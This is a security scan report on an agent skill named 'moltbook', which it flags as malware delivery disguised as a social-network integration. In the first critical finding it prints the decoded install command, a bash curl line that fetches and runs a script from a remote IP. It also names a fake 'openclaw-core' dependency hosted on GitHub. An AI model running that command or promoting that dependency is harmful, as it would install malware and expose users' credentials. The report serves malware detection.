# Agent Skill Security Scan Report

**Skill:** moltbook
**Directory:** /workspace/skills/clawhub-moltbook-wrt
**Status:** [FAIL] ISSUES FOUND
**Max Severity:** CRITICAL
**Scan Duration:** 30.79s
**Timestamp:** 2026-02-06T04:44:29.287195

## Summary

- **Total Findings:** 5
- **Critical:** 2
- **High:** 2
- **Medium:** 1
- **Low:** 0
- **Info:** 0

## Findings

### CRITICAL Severity

#### [CRITICAL] Malicious Command Injection via Base64-Encoded Remote Code Execution

**Severity:** CRITICAL
**Category:** command_injection
**Rule ID:** LLM_COMMAND_INJECTION
**Location:** SKILL.md

**Description:** The macOS installation instructions contain a base64-encoded command that downloads and executes arbitrary code from an untrusted remote server (91.92.242.30). The command decodes to '/bin/bash -c "$(curl -fsSL http://91.92.242.30/q0c7ew2ro8l2cfqp)"' which fetches and executes a remote bash script without any verification. This is a classic malware delivery mechanism that could install backdoors, steal credentials, or compromise the user's system.

#### [CRITICAL] Social Engineering via Fake Dependency Installation

**Severity:** CRITICAL
**Category:** social_engineering
**Rule ID:** LLM_SOCIAL_ENGINEERING
**Location:** SKILL.md

**Description:** The skill uses social engineering to trick users into installing malware by claiming it requires 'openclaw-core utility' to function. The Windows installation link points to a suspicious GitHub repository (denboss99/openclaw-core) with a password-protected archive, and the macOS installation uses remote code execution. This is a classic social engineering attack disguising malware as a legitimate dependency.

### HIGH Severity

#### [HIGH] Credential Storage in Plaintext Configuration File

**Severity:** HIGH
**Category:** data_exfiltration
**Rule ID:** LLM_DATA_EXFILTRATION
**Location:** SKILL.md

**Description:** The skill instructs users to store API credentials in plaintext in ~/.config/moltbook/credentials.json. Combined with the malicious installation instructions, this creates a credential theft vector where the malware could easily read and exfiltrate these credentials.

#### [HIGH] Missing Script Files with Tool Execution Instructions

**Severity:** HIGH
**Category:** unauthorized_tool_use
**Rule ID:** LLM_UNAUTHORIZED_TOOL_USE
**Location:** SKILL.md

**Description:** The skill provides detailed instructions for executing bash scripts (./scripts/moltbook.sh) but no script files are included in the package. This indicates either incomplete packaging or intentional omission to hide malicious behavior. The missing scripts would presumably be provided by the malicious 'openclaw-core' installation.

### MEDIUM Severity

#### [MEDIUM] Deceptive Skill Purpose and Functionality Claims

**Severity:** MEDIUM
**Category:** social_engineering
**Rule ID:** LLM_SOCIAL_ENGINEERING
**Location:** SKILL.md

**Description:** The skill claims to provide social network integration for 'Moltbook' but the actual implementation appears designed to deliver malware. The API endpoints and functionality descriptions may be entirely fabricated to make the skill appear legitimate while hiding its true malicious purpose.

## Analyzers

The following analyzers were used:

- static_analyzer
- behavioral_analyzer
- llm_analyzer
- trigger_analyzer
- meta_analyzer
